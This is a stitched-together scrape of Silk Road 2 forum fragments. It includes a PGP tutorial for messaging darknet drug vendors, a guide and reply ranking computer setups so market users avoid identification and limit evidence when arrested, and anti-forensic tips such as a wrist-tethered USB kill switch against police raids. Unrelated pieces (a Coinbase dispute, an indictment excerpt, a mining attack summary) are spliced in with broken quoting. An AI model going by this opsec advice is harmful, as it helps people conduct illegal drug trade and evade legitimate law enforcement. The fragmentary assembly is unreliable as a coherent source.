block""http://i.imgur.com/hXOmk6F.png- Go into your desktop or a folder of your choice. Right click, create document -> empty file. You can call it whatever you want but don't forget to name the extension .asc which makes things easier. http://i.imgur.com/r5KErV6.pnghttp://i.imgur.com/BaTHgAK.png- Right click the file you just created, choose Open with -> geditRight click inside the file, and Paste the key you just copied. Then save and close.http://i.imgur.com/gdA6oTQ.png- Right click the file and select ""Open with Import Key"". I suggest you save all the vendors key like in (1.) so that you won't have any hassle every time you boot TAILS because it's ready to import.http://i.imgur.com/MptFAQT.pnghttp://i.imgur.com/CL53cIS.png- Go into a text area anywhere and just type the message you like to send, then copy it.http://i.imgur.com/fAfPDgE.png- In the top bar, click the clipboard icon, then select ""Sign/Encrypt Clipboard with Public Keys"". We're going to encrypt the messagehttp://i.imgur.com/DtRuySW.png- Select the vendor you'd like to send the message to in the list (select ""hide recipients"" if you want that nobody sees who that message is sent to) and click OK, then Yes.http://i.imgur.com/58y4AXZ.pnghttp://i.imgur.com/4MAFM7M.png- Go to the vendor Profile and click ""send a message"". Paste your encrypted message in the textbox.http://i.imgur.com/893qSxf.png(4) I want to decrypt a message that someone sent to me- Copy the message you received including the lines where it says ""begin pgp message"" and ""end pgp message""http://i.imgur.com/OZV0Cf2.png- In the top bar, select ""Decrypt/Verify Clipboard""http://i.imgur.com/TfSuc38.png- Select your key and insert your passphrase - A window will appear, showing you the decrypted messagehttp://i.imgur.com/KnG3Kke.pngError?- I'm trying to import a key or decrypt a message but it throws me an error.Most of the times this is caused by text formatting. In fact, the PGP tool only accept perfectly formatted text. People on reddit will just past the key/message but this is not good.When you have to paste something into reddit, always add 4 spaces before each line. This way, reddit will treat it as code and importing/decrypting will be fine.Or better yet, use pastebin.com.Anybody feel free to xpost this to any other subreddits or into the silk road forums.Edit: formatting"

I can remove Tor and give the mac disc a clean.  Any security savvy people think this is safe enough to proceed?    After all they shouldn't be doing any in depth snooping.  I have a bitcoin wallet on there but thats not illegal, just hope it won't raise any suspicious eyebrows from the guy's that I'm paying to fix it.    Any advice greatly appreciated.

Now, when you communicate to somebody over PGP, you IRREVOCABLY firm that ""you are you"", and associates that with you ID on SR. Now SR gets down by LE and they have all your historical trades.

"Silk Road 2 Forums","jesusofrave","1499","2013-10-27T10:38:59","Astors Suggested Computer Security Setups | from old SR forums.","Discussion/Security","We made a local copy of this conversation from the old forums - we though it might be useful here...  jor  =========================================================================================================  In the wake of the Freedom Hosting exploit, I think we should reevaluate our threat model and update our security to better protect ourselves against the real threats that we face. So I wrote this guide in order to spark a conversation. It is by no means comprehensive. I only focus on technical security. Perhaps others can address shipping and financial security. I welcome feedback and would like these ideas to be critiqued and expanded.   As I was thinking about writing this guide, I decided to take a step back and ask a basic question: what are our goals? I've come up with two basic goals that we want to achieve with our technical security.  1. Avoid being identified. 2. Minimize the damage when we are identified.  You can think of these as our _guiding security principles_. If you have a technical security question, you may be able to arrive at an answer by asking yourself these questions:  1. Does using this technology increase or decrease the chances that I will be identified? 2. Does using this technology increase or decrease the damage (eg, the evidence that can be used against me) when I am identified?  Obviously, you will need to understand the underlying technology to answer these questions.  The rest of this guide explains the broad technological features that decrease the chances we are identified and that minimize the damage when we are identified. Towards the end I list specific technologies and evaluate them based on these features.  First, let me list the broad features that I have come up with, then I will explain them.  1. Simplicity 2. Trustworthiness 3. Minimal execution of untrusted code 4. Isolation 5. Encryption  To some extent, we've been focusing on the wrong things. I've predominantly been concerned with network layer attacks, or ""attacks on the Tor network"", but it seems clear to me now that application layer attacks are far more likely to identify us. The applications that we run over Tor are a much bigger attack surface than Tor itself. We can minimize our chances of being identified by securing the applications that we run over Tor. This observation informs the first four features that we desire.   ===Simplicity===  Short of not using computers at all, we can minimize threats against us by simplifying the technological tools that we use. A smaller code base is less likely to have bugs, including deanonymizing vulnerabilities. A simpler application is less likely to behave in unexpected and unwanted ways.  As an example, when the Tor Project evaluated the traces left behind by the browser bundle, they found 4 traces on Debian Squeeze, which uses the Gnome 2 desktop environment, and 25 traces on Windows 7. It's clear that Windows 7 is more complex and behaves in more unexpected ways than Gnome 2. Through its complexity alone, Windows 7 increases your attack surface, exposing  you to more potential threats. (Although there are other ways that Windows 7 makes you more vulnerable, too.) The traces left behind on Gnome 2 are easier to prevent than the traces left behind on Windows 7, so at least with regard to this specific threat, Gnome 2 is desirable over Windows 7.  So, when evaluating a new technological tool for simplicity, ask yourself these questions:  Is it more or less complex than the tool I'm currently using? Does it perform more or fewer (unnecessary) functions than the tool I'm currently using?   ===Trustworthiness===  We should favor technologies that are built by professionals or people with many years of experience rather than newbs. A glaring example of this is CryptoCat, which was developed by a well-intentioned hobbyist programmer, and has suffered severe criticism because of the many vulnerabilities that have been discovered.  We should favor technologies that are open source, have a large user base, and a long history of use, because they will be more thoroughly reviewed.  When evaluating a new technological tool for trustworthiness, ask yourself these questions:  Who wrote or built this tool? How much experience do they have? Is it open source, and how big is the community of users, reviewers, and contributors?   ===Minimal Execution of Untrusted Code===  The first two features assume the code is trusted but has potential unwanted problems. This feature assumes that as part of our routine activities, we may have to run arbitrary untrusted code. This is code that we can't evaluate in advance. The main place this happens is in the browser, through plug-ins and scripts.  You should completely avoid running untrusted code, if possible. Ask yourself these questions:  Are the features that it provides absolutely necessary? Are there alternatives that provide these features without requiring plug-ins or scripts?   ===Isolation===  Isolation is the separation of technological components with barriers. It minimizes the damage incurred by exploits, so if one component is exploited, other components are still protected. It may be your last line of defense against application layer exploits.  The two types of isolation are physical (or hardware based) and virtual (or software based). Physical isolation is more secure than virtual isolation, because software based barriers can themselves be exploited by malicious code. We should prefer physical isolation over virtual isolation over no isolation.  When evaluating virtual isolation tools, ask yourself the same questions about simplicity and trustworthiness. Does this virtualization technology perform unnecessary functions (like providing a shared clipboard)? How long has it been in development, and how thoroughly has it been reviewed? How many exploits have been found?   ===Encryption==  Encryption is one of two defenses we have to minimize the damage when we are identified. The more encryption you use, the better off you are. In an ideal world, all of your storage media would be encrypted, along with every email and PM that you send. The reason for this is because, when some emails are encrypted but others are not, an attacker can easily identify the interesting emails. He can learn who the interesting parties are that you communicate with because those will be the ones you send encrypted emails to (this is called metadata leakage). Interesting messages are lost in the noise when everything is encrypted.  The same goes for storage media encryption. If you store an encrypted file on an unencrypted hard drive, an adversary can trivially determine that all the good stuff is in that small file. But when you use full disk encryption, you have more plausible deniability as to whether the drive contains data that would be interesting to that adversary, because there are more reasons to encrypt an entire hard drive than a single file. Also, an adversary who bypasses your encryption would have to cull through more data to find the the stuff that is interesting to him.  Unfortunately, using encryption incurs a cost that the vast majority of people can't bare, so at a minimum, sensitive information should be encrypted.  On a related note, the other defense against damage is secure data erasure, but that takes time that you may not have. Encryption is preemptive secure data erasure. It's easier to destroy encrypted data, because you only have to destroy the encryption key to prevent an adversary from accessing the data.  Finally, I'd like to add a related non-technical feature.  ===Safe Behavior===  In some cases, the technology we use is only as safe as our behavior. Encryption is useless if your password is ""password"". Tor is useless if you tell someone your name. It may surprise you how little an adversary needs to know about you in order to uniquely identify you. Here are some basic rules to follow:  Don't tell anyone your name. (obv) Don't describe your appearance, or the appearance of any major possessions (car, house, etc.). Don't describe your family and friends. Don't tell anyone your location beyond a broad geographical area. Don't tell people where you will be traveling in advance (this includes festivals!). Don't reveal specific times and places where you lived or visited in the past. Don't discuss specific arrests, detentions, discharges, etc. Don't talk about your school, job, military service, or any organizations with official memberships. Don't talk about hospital visits.  In general, don't talk about anything that links you to an official record of your identity.   ===A List of Somewhat Secure Setups for Silk Road Users===  I should begin by pointing out that the features outlined above are not equally important. Physical isolation is probably the most useful and can protect you even when you run complex and untrusted code. In each of the setups below, I assume a fully updated browser / TBB with scripts and plug-ins disabled. Also, the term ""membership concealment"" means that someone watching your internet connection doesn't know you are using Tor. This is especially important for vendors. You can use bridges, but I've included extrajurisdictional VPNs as an added layer of security.  With that in mind, here is a descending list of secure setups for SR users.  Starting off, I present to you the most secure setup!  #1  A router with a VPN + an anonymizing middle box running Tor + a computer running Qubes OS.  Advantages: physical isolation of Tor from applications, virtual isolation of applications from each other, encryption as needed, membership concealment against local observers with VPN  Disadvantages: Qubes OS has a small user base and is not well tested, as far as I know.  #2  Anon middle box (or router with Tor) + Qubes OS  Advantages: physical isolation of Tor from applications, virtual isolation of applications from each other, encryption as needed  Disadvantages: Qubes OS has a small user base and is not well tested, no membership concealment  #3  VPN router + anon middle box + Linux OS  Advantages: physical isolation of Tor from applications, full disk encryption, well tested code base if it's a major distro like Ubuntu or Debian  Disadvantages: no virtual isolation of applications from each other  #4  Anon middle box (or router with Tor) + Linux OS  Advantages: physical isolation of Tor from applications, full disk encryption, well tested code base  Disadvantages: no virtual isolation of applications from each other, no membership concealment   #5  Qubes OS by itself.  Advantages: virtual isolation of Tor from applications, virtual isolation of applications from each other, encryption as needed, membership concealment (possible? VPN may be run in VM)  Disadvantages: no physical isolation, not well tested  #6  Whonix on Linux host.  Advantages: virtual isolation of Tor from applications, full disk encryption (possible), membership concealment (possible, VPN can be run on host)  Disadvantages: no physical isolation, no virtual isolation of applications from each other, not well tested  #7  Tails  Advantages: encryption and leaves no trace behind, system level exploits are erased after reboot, relatively well tested  Disadvantages: no physical isolation, no virtual isolation, no membership concealment, no persistent entry guards! (but can manually set bridges)    I consider the following to be INSECURE setups.  #8  Whonix on Windows host.  Advantages: virtual isolation, encryption (possible), membership concealment (possible)  Disadvantages: no physical isolation, no virtual isolation of applications from each other, not well tested, VMs are exposed to Windows malware!  #9  Linux OS  Advantages: full disk encryption (possible), membership concealment (possible)  Disadvantages: no physical isolation, no virtual isolation  #10  Windows OS  Advantages: full disk encryption (possible), membership concealment (possible)  Disadvantages: no physical isolation, no virtual isolation, the biggest target of malware and exploits!   Assuming there is general agreement about the order of this list, our goal is to configure our personal setups to be as high up on the list as possible.  Thanks for your attention, and again I welcome comments and criticism. ",""

"Silk Road 2 Forums","jesusofrave","1499","2013-10-27T10:39:17","Astors Suggested Computer Security Setups | from old SR forums.","Discussion/Security"," ///////////////////   Quote      1. Simplicity     2. Trustworthiness     3. Minimal execution of untrusted code     4. Isolation     5. Encryption   I would just like to say that there are generally three broad sorts of security mechanisms when it comes to protecting from hackers. These are isolation, correctness and randomization. I wish I still had the picture from Polyfront showing the various things to protect from, but generally:  Forensic analysts -> They primarily attempt to analyze your computer system, primarily hard drive, in order to find damning evidence or intelligence for future investigations. Forensics is a broad terminology and can mean various things when it comes to computers, but this is the traditional role of computer forensics. This sort of forensics is also called dead forensics because they are dealing with already seized computer equipment. Live forensics is what the FBI attack against users accessing FH sites is called, better known as hacking.  Traffic Analysts / Signals Intelligence -> They primarily gather and analyze communication carrying signals in an attempt to determine who is talking with who, or to trace the origin of a signal. These are the people who would launch a direct attack on Tor, for example carrying out the attack that traces hidden services to their entry guards. They are not generally very concerned with the content of a signal but rather with its meta-characteristics.   Network Analysts -> They are primarily interested in mapping out groups of people and the relationships between them. They could use traffic analysis to do this, or various other techniques.  Communications Intelligence -> Is primarily concerned with finding out what people say to each other. Whereas signals intelligence is interested primarily in the meta-characteristics of communication carrying signals, communications intelligence is primarily interested in the content of communication carrying signals. A communications intelligence attack may be running a server like Tor mail and gathering drug shipment addresses from everybody who doesn't encrypt them. In some cases meta-characteristics of communication signals can be used to determine the communications, in these cases communications intelligence would be interested in the meta-characteristics.  Hackers / Live Forensics -> Is primarily concerned with gaining unauthorized access to remote computers. This is very dangerous because it can be used as a hard to protect from vector through which all other sorts of intelligence can be gathered (by passing Tor removes the need for traffic analysis and leads to easy communications gathering, network analysis, remote forensics, etc).  Open Source Intelligence -> I believe an example of Open Source intelligence would be running a Tor exit node in an attempt to identify interesting servers on the clear net.  ________  Traditional forensic analysts (dead forensics) are confounded almost entirely by FDE with strong passphrases. In some cases the feds may attempt to circumvent FDE by carrying out cold boot attacks, using keyloggers or hidden cameras, etc. The first level of security comes from using FDE in the first place. The second level of security comes from protecting from the various ways in which FDE keys can be obtained covertly. To protect from Cold Boot attacks you may use a system like Tresor which stores encryption keys in CPU registers rather than in RAM. You can use a motherboard with chassis intrusion detection support and set it to wipe encryption keys immediately if the case is breached. You can configure a system similar to tails, where you have a USB stick that once removed immediately results in the computer shutting down into a memory wipe (tails does this but you can configure similar things for any OS). You could tether this USB stick to a wrist strap and wear it while you work on your computer, so even if the feds rush in and tackle you they will result in the USB stick being pulled out of the PC. You can have hot key combinations on your keyboard, or even a single key, that immediately shuts down into a memory wipe in case of emergency.  You also need to follow good operational security procedures. Don't leave your system booted up when you are not near it. Use multiple layers of encryption. FDE is the catch all, but you should also have any stored information individually encrypted with some symmetric algorithm via GPG. If you have stored content keep it encrypted with GPG in a Truecrypt container on a drive that is FDE encrypted, and compartmentalize your stuff, there is no need for your entire FDE drive to have its entire content available in plaintext when it is booted. Various OS allow the home folder to be encrypted separately and mounted with the root password during login, and will automatically dismount it and take you to a login screen after some period of time. Using various layers of encryption like this makes it less likely that all of them will be compromised.  The hardest thing to protect yourself from is a covertly placed keylogger or pinhole camera. These can be used to gather all of your encryption passphrases without you even noticing. There are only a few ways to protect from this. The first method is to use a laptop that you literally never let of your sight, and that you sleep next to even. The second method is to use a laptop that you keep in a strong safe when you are not using. The third method is to use battery powered hidden cameras that monitor all entrance points to your PC, and to check for previous surreptitious entry every time before you type your password in.  Even if you follow all of these steps you are not totally protected. TEMPEST attacks and remote keylogging attacks (such as laser microphone on a nearby window to gather the sound of you typing, for analysis that can lead to the keystrokes you have made) are still possible. In some cases what you type can even leak into the power grid for semi-remote gathering, if you have your system plugged into a power outlet while you type on it. Taking care of every possible attack like this is next to impossible without having something near a SCIF , secure compartmentalized information facility. This is not realistic for us to do. However, it is rare that the police will go to such lengths, and every additional layer of security you add makes it less likely they will be able to obtain a complete plaintext copy of your drive.  Traffic analysts and signals intelligence is very difficult to protect from, especially if the NSA is your adversary. Using Tor offers some level of protection, it is probably breakable by the NSA in many cases but there is not much better right now. To get the most out of Tor you need to make sure you are using it correctly. In my opinion this entails not using tails, because it causes too much entry guard rotation and makes it so Tor does not offer you as much protection as it can. Hopefully using regular Tor is enough for now, if it is not there isn't much you can do other than look at Freenet perhaps. I2P is not really something I would even consider, and it is horrible for our threat model. Hopefully a new generation of anonymity technology is around the corner.  Communications intelligence can be protected from by always making sure to use GPG , OTR, or similar. There is still a risk of MITM attacks so it is a good idea to check public keys over multiple independently operated channels (not key servers though), and to create and utilize OTR shared secrets for authentication. OTR without authentication is actually very weak to MITM attacks.  Live Forensics is what I would be most worried about because it is the hardest to protect from and stands to gain the most. The techniques for protecting from this generally fall into three broad categories, isolation, correctness and randomization. I think that there are more methods than this though. Isolation would entail running Firefox in a virtual machine that isn't aware of an external IP address and which also don't have the ability to access the Tor process. There are other isolation tools as well, primarily mandatory access controls, these are hard to configure but can provide a great deal of security as well. Correctness means that the programs you are running are implemented properly and without bugs. Almost all programs have security bugs in them, they just might not have any currently known at a specific point in time. Keeping everything fully patched and updated is a requirement for security, the more you lag behind a patch the more likely you are to get pwnt. Additionally, different operating systems and programs have different levels of correctness due to the skill level of the people who implemented them as well as the sort of analysis they have been subjected to. Generally you want to use the most correct OS possible with the most correct applications included. This means you would opt for Debian stable over Ubuntu, Debian stable has a slow release cycle and prior to a release of the OS it and its included applications have been analyzed significantly. Ubuntu on the other hand puts more focus on features than it does on stability. At the extreme end of the spectrum you have operating systems like OpenBSD which have been subjected to continuous security audits for many years and are thought to be largely correct. I personally would actually probably opt for qubes though due to the sophisticated way it has implemented isolation. Randomization refers to features such as ASLR, which can make vulnerabilities that are present much harder to exploit.  So once you find the right balance of isolation, correctness and randomization in the OS and software you use, you still are not done. You need to configure the system in a secure way still. This could entail firewall rules, individual hardening of applications (particularly the browser, which at the very least should have javascript disabled), and general hardening of the OS. There are other security programs that can be added as well, such as intrusion detection systems, etc.  Quote      To some extent, we've been focusing on the wrong things. I've predominantly been concerned with network layer attacks, or ""attacks on the Tor network"", but it seems clear to me now that application layer attacks are far more likely to identify us. The applications that we run over Tor are a much bigger attack surface than Tor itself. We can minimize our chances of being identified by securing the applications that we run over Tor. This observation informs the first four features that we desire.   I think both are serious threats, I would be more worried about application layer attacks as well but I would not ignore the possibility of direct attacks on Tor by any means.  Quote      ===Trustworthiness===      We should favor technologies that are built by professionals or people with many years of experience rather than newbs. A glaring example of this is CryptoCat, which was developed by a well-intentioned hobbyist programmer, and has suffered severe criticism because of the many vulnerabilities that have been discovered.   BitMessage is another good example of this.  Quote      Isolation is the separation of technological components with barriers. It minimizes the damage incurred by exploits, so if one component is exploited, other components are still protected. It may be your last line of defense against application layer exploits.      The two types of isolation are physical (or hardware based) and virtual (or software based). Physical isolation is more secure than virtual isolation, because software based barriers can themselves be exploited by malicious code. We should prefer physical isolation over virtual isolation over no isolation.   Indeed, and it all comes back to complexity. Routing your traffic through an old computer that you turned into a Tor router that runs on OpenBSD is much more secure than running an OS in virtualbox that routes through Tor on the host. If your primary computer is rooted in the first case, the attacker will very likely need to exploit Tor to deanonymize you on the application layer. If the guest OS is rooted in the second case, the attacker could exploit virtualbox to break out of the isolation OR they could exploit Tor to break out of the isolation. Using virtualbox for isolation adds an entire large chunk of code that you need to trust not to be exploitable, versus the hardware solution where you are primarily only trusting the Tor code to not be exploitable. On the other hand, if you use no isolation at all, then you are not getting any additional protection, and as soon as your network facing application is pwnt you are deanonymized (as we saw in the freedom hosting attack).  It is also worth noting that firewall rules could have prevented the freedom hosting attack from working, as could have mandatory access controls. A combination of mandatory access controls + virtual or hardware isolation + firewall rules would have added three different layers of security via isolation that an attacker would have needed to overcome before they could get their payload to phone home.  Quote      When evaluating virtual isolation tools, ask yourself the same questions about simplicity and trustworthiness. Does this virtualization technology perform unnecessary functions (like providing a shared clipboard)? How long has it been in development, and how thoroughly has it been reviewed? How many exploits have been found?   Also ask yourself ""Does this virtualization based isolation tool support ASLR? does it support NX-bit?"". Xen is probably the most secure virtualization system in that it will be hardest for the attacker to break out of. This is why Qubes uses Xen. On the other hand, Xen doesn't support ASLR. This means that if you run Firefox in a Xen VM, it is probably more likely that an attacker can exploit its vulnerabilities than it is that the same attacker could exploit its vulnerabilities if it was in a virtualbox VM. On the other hand, it is more likely that the attacker will be able to break out of the virtualbox isolation than it is that they will be able to break out of the xen isolation. I am not sure where the correct balance is, but the answer is probably to use hardware isolation because it is the strongest isolation possible and it also supports ASLR and everything else. Or maybe the solution is to use Hardware isolation + virtual isolation, but then we are back to square one, should we use virtual isolation that is harder to penetrate or virtual isolation that allows us to use other important security mechanisms as well.   Quote      I should begin by pointing out that the features outlined above are not equally important. Physical isolation is probably the most useful and can protect you even when you run complex and untrusted code.   Physical isolation with Tor on an OpenBSD box = 2 orders of magnitude more secure than running vanilla TBB. Physical isolation with GPG keys on an air gapped machine = 2 more orders of magnitude more secure. Physical isolation of the network facing applications from Tor, and air gapped GPG keys is probably close to the best you can hope for when it comes to protection from hackers.  Quote      A router with a VPN + an anonymizing middle box running Tor + a computer running Qubes OS.   I agree, but don't forget to air gap your GPG keys and plaintext messages  .  Quote      Advantages: physical isolation of Tor from applications, full disk encryption, well tested code base if it's a major distro like Ubuntu or Debian      Disadvantages: no virtual isolation of applications from each other   You could always use Xen or something else yourself. Most people only really want to isolate a few applications, maybe Pidgin and Tor Browser and GPG. You don't really need Qubes for this, it just tries to make it easier and prettier. And Xen is very well tested and widely used.  Quote      Whonix on Linux host.   This is a good bet as well, and the biggest advantage is ease of use versus Qubes I would say.  Quote      Disadvantages: no physical isolation, no virtual isolation of applications from each other, not well tested   A big plus for qubes is virtual airgapped GPG, but this can be configured manually with Xen or VB as well.  Quote      Tails      Advantages: encryption and leaves no trace behind, system level exploits are erased after reboot, relatively well tested      Disadvantages: no physical isolation, no virtual isolation, no membership concealment, no persistent entry guards! (but can manually set bridges)   No persistent entry guards is a massive disadvantage, if you don't set persistent bridges don't use Tails. If they add persistent entry guards I would consider it a fine solution and although not on the level of Whonix or Qubes it would be a solid third place. They shoot themselves in the foot by not having persistent entry guards though, so make sure you use bridges if you use Tails. It is worth noting that had the FH attackers targeted Linux, their payload would have failed to phone home because of their firewall rules (but it didn't target Linux in the first place).  Quote      Whonix on Windows host.      Advantages: virtual isolation, encryption (possible), membership concealment (possible)      Disadvantages: no physical isolation, no virtual isolation of applications from each other, not well tested, VMs are exposed to Windows malware!   Definitely on the insecure side of the spectrum, although it would have protected from the FH attack.   Quote      Linux OS      Advantages: full disk encryption (possible), membership concealment (possible)      Disadvantages: no physical isolation, no virtual isolation   Definitely on the insecure side of the spectrum as well, it only protected from FH attack because of security via obscurity which is never what you want to rely on. Isolation is important. Tails is a bit of an exception because even if Linux had been targeted Tails would have prevented the exploit from phoning home. Technically you could configure similar firewall rules on any Linux OS, but you didn't specify that in the description, and virtualization based isolation is much better anyway.  Quote      #10      Windows OS      Advantages: full disk encryption (possible), membership concealment (possible)      Disadvantages: no physical isolation, no virtual isolation, the biggest target of malware and exploits!   This is about as insecure as you can get.  /////////////////////   Quote      What do you mean by virtual air-gapped?   I just meant isolated I shouldn't have said air-gapped since that actually means isolated such that there is  a complete lack of an attackable path to it from the internet. Virtualization used for isolation of GPG private key simulates air gaps but it isn't as secure. Qubes allows for storing GPG private keys and plaintexts in an isolated domain but it still has a path to it if the hackers can break out of the virtualization. On the other hand, running GPG on a machine without any attack path from the internet to it is a real air gap.  The best is probably to have two machines for encryption. Machine 1 has your private key on it and is used for decrypting messages, it can have ciphertexts from the internet brought over to it via one time use CD's (so can be infected), but never has any outgoing patch to the internet (so cannot phone home). Machine 2 is used for encrypting messages, it can have ciphertexts sent from it via one time use CD's (so can phone home) but it cannot have anything brought to it by media that has accessed the internet (so cannot be infected).  Your private key will be completely protected. The only way an attacker could compromise your plaintexts is if they hack you via a public GPG key somehow (which you must load to be able to encrypt messages to people), and then configure your system to somehow send out the information they are interested in, perhaps by screwing with your PRNG so they can always determine the session key of your outgoing ciphertexts.   //////////// ",""

However, be aware, that as of version 14.04 LTS you still have to get rid of the preinstalled ""spyware"" / ""adware"" or whatever you may wanna call it. I's basically logging all your shit in order to suggest products you might wanna buy on amazon etc.  As far as I know, as of 14.10 this problem has been taken care of.  Ubuntu is super easy to handle for beginners, the spyware removing thingy is really trivial. You will find extensive documentation on just about anything Ubuntu related on the web.  You could also look into the Xubuntu variant, which is basically the same operating system, but with a different graphical userface preinstalled, which is called Xfce. It is leightweight in terms of using resources and very user-friendly. Big plus is you do not have to get rid of the above mentioned spyware thing, as it is limited to the Unity desktop, which comes with standard Ubuntu.  Linux Mint has also received praises from many for being newbie friendly. So this one might also be worth looking into. But both Mint and Ubuntu are essentially based on Debian, which is commonly regarded as one of the best general purpose operating systems. I'd prefer Debian.. With Ubuntu/Mint, they've just added some tweaks and shiny things to appeal to the regular desktop user. Which is absolutely not a bad thing! Toss that Windows shit in the trashbin already!! It might in some cases take some more effort to get Debian running, but if you have successfully used a computer before without causing harm. you will definitely manage . Great documentation, timely security updates endless possibilities to adjust it to your liking. There are live CDs available as well.",""

I'm running Tails successfully from a usb drive and have also created a persistant volume on said usb. I've used gpg4usb to generate a keyset, and have the gpg4usb folder stored in my persistant volume. My question is - is keeping that gpg4usb folder in my persistant volume enough to store/protect my private key, or do I somehow need to export my private key and store it separately in the persistant volume or even a different storage medium perhaps?

It basically describes a potential attack whereby a pool of selfish miners, having acquired a temporary single block lead on the 'true' block chain, keep this information back, only revealing it when the true blockchain catches up. By pursuing this strategy they will earn more than honest miners and since this incentive increases with the size of this selfish pool, all miners will have an incentive to join until the selfish pool>50% and bitcoin becomes a centralized currency controlled by the pool.

From in or about January 2011, up to and including on or about October 2, 2013, an underground website known as ""Silk Road"" hosted a sprawling black-market bazaar on the Internet, where illegal drugs and other illi:it goods and services were regularly bought and sold by the site's users. 2. During its more than two-and-a-half years in operation, Silk Road was used by several thousand drug dealers and other unlawful vendors to distribute hundreds of kilograms of illegal drugs and other illicit goods and services to well over a hundred thousand buyers, and to launder hundreds of millions of dollars deriving from ~hese unlawful transactions. 3. The owner and operator of Silk Road, Ross William Ulbricht, a/k/a ""Dread Pirate Roberts,"" a/k/a ""DPR,"" a/k/a ""Silk Road,"" ran the website with the assistance of a small support staff, including both site administrators and forum moderators. The site administrators were respo::1sible for, among other things, monitoring user activity on Silk Road for problems, responding to customer service inquiries, and resolving disputes between buyers and vendors. The forum moderators were responsible for, among other things, monitoring user activity on discussion forums associated with the site, providing guidance to forum users concerning how to c8nduct business on Silk Road, and reporting any significant problems discussed on the forums to the site administrators and to Ulbricht. Ulbricht paid the site administrators and forum moderators salaries ranging from approximately $50,000 to approximately $75,000 per year for their services. 4.

I have recently put it to the test with a tiny $56.00 transaction. 9 days later after they had already taken the money from my bank the canceled it and deemed it ""High Risk"". This was simply because I, like many of you bought some coin when the price dipped to $600.00 it has since raised significantly. I have never had a negative transaction as this was actually my very first, My banking information was verified (which I'm now worried about such a corrupt site having) as was my identity.

"Silk Road 2 Forums","SelfSovereignty","8656","2013-12-15T01:18:40","COINBASE Frauds. ","Discussion/Security","I would like to point out how I believe Coinbase works, and why exactly this sort of accusation is far fetched.  I say ""I think..."" because I'm not a Coinbase employee.  As I've said before, I am a programmer though (oh noez, now there are only 5 million people I could be instead of 150 million!)  Coinbase works much like SR, in that the coins in your account aren't technically yours or under your control (legally they may be ""yours,"" but they're still under the control of Coinbase).  That's how any internet wallet service works -- they have to be the ultimate controller, or they can't perform actions on your behalf.  The only way around this is to use a local application like bitcoin-qt or Electrum, etc.  Now Coinbase, unlike most wallet services, lets you just straight up buy coins and fund the purchase with a bank account.  I think we all know that.  But where do the coins come from?  Well in the case of some of them, they're in a pool that Coinbase keeps.  They'll also buy your coins and deposit the money into your bank account, and some of those coins (who knows what proportion) go toward fulfilling the purchase orders of other customers.  So they've got a constant stream coming in and going out.  I have no doubt they sell many more coins than they purchase, so I expect they almost never sell coins at an exchange.  They should, however, have to purchase coins from exchanges in order to fulfill their orders.  Additionally, they MUST keep a pool of immediately available coins to fulfill all the ""instant"" purchases they get.  If they didn't have the coins themselves, they would have to first transfer the coins to a wallet they control, then forward them on to you.  But that would double the time it takes to actually get your coins.  That's kind of their selling point (or at least it used to be, now they're just kind of ""do everything Bitcoin-y"" guys), so I'm sure they're pretty strict about this pool of available coins being available 24/7.  Now what you're saying is that you put in a purchase order.  Their system will then be able to expect the additional funds required, and it should go out and purchase those coins at whatever price you just bought them at.  They have to do this in order to make sure that your coins don't end up being an unexpected drain on their ""immediately available"" pool.  So basically, when you purchase the coins from them, they presumably go out and purchase the coins at whatever exchange and then sit on them waiting for the bank transaction to not only clear, but to be basically ""guaranteed"" (as in you can't charge it back, you can't claim it was fraud, etc., etc.. -- the money is theirs and they keep it even if you try to get it back).  THEN they forward your coins to your account.  Apparently even that isn't good enough though, because apparently there's some credit card requirement now  just in case the bank transaction gets reversed unexpectedly (I really don't know how that happens, but then I don't go around committing fraud).  So look at the situation: they have an automated system all set up and that requires minimum maintenance and monitoring to keep running smoothly.  They make money every single time someone buys coins from them OR sells coins to them (they get their fee either way).  They put the purchase order in at the exchange as soon as you put the purchase order in with them; otherwise they'd be stupid and the system wouldn't be very ""automated"" and they'd require more than the what, 8 employees they actually have.  So what you're accusing them of doing is canceling transactions at the last minute, even though they have the coins and the money has gone through.  Why in the name of fucking God would they do this?  They're huge.  They're one of the largest Bitcoin businesses in the world today, and they're continuing to grow.  They get their money whether they give you those coins or not.  So when would they NOT make money on that transaction?  If it's fraudulent, and if they somehow end up holding no cash payment for the coins they've just sent you and will never see again.  That must be, I imagine, their #1 problem.  This means that ultimately, you're telling us that their system isn't just a little overzealous in its algorithms because it's designed to stop their #1 loss of profits as well as protect their massive,  automated system from screwing up and bankrupting them overnight before anybody notices.  No, that isn't what's going on.  What's  really going on is that they have a secret policy as part of their automated system that cancels half of the orders they've currently got and are in the process of fulfilling, if the price has risen X amount of dollars since that purchase was submitted to them.  So customer service is out the window.  So respect for people is out the window.  So the fact that they're making money hand over fist is out the window.  The fact that they have investors with virtually limitless pockets to fund whatever they think will make everybody more money is just out the window.  This is a company that has millions and millions just sitting there because they've secured funding for what's probably half a decade.  But instead of working together in the very, very small company that they all want to see succeed and that they all put their hearts into every day (small companies and startups get awfully personal, believe me), someone there is canceling transactions.  But then what's happening to the coins?  Is whoever canceled the transaction stealing them?  But what about the books -- that's literally embezzling money out of the company coffers.  Literally.  They have very rich, very powerful investors that don't take kindly to thieves.  Now is your accusation still possible?  Yes, of course it is.  It could be going on here or there, and I'd even wager it's happened at least once because somebody fucked up & couldn't pay their credit card bill that month or something.  But a systematic policy?  I'm sorry, but I just don't buy it.  It's not a long term goal, and it's not even what I would expect the most profitable method of operation to be.  If you wish to continue to accuse them of doing this, then so be it, you have every right to your own opinion.  But at least be aware of what precisely it is you're going around telling people is happening.",""

As I started making larger purchases, they would start to get kicked back as ""High Risk"" as well. I had never had a failed/returned transaction so there was no reason for them to do this.  I contacted support through email, and they whitelisted my account after reviewing the history so that all transactions would go through. I have not had an issue since then on. This was when CB was just a month or two old, and the instant BTC purchase limit was still in beta at 50BTC/day max rather than the current 10BTC/week.  I would be more likely to believe that it is a glitch, or a poorly implemented risk engine that causes bottlenecks requiring manual reviews than fraud. I had bought bitcoins when they were at around $250 each the day before the jump began. By the time they arrived, they were worth $600 each.

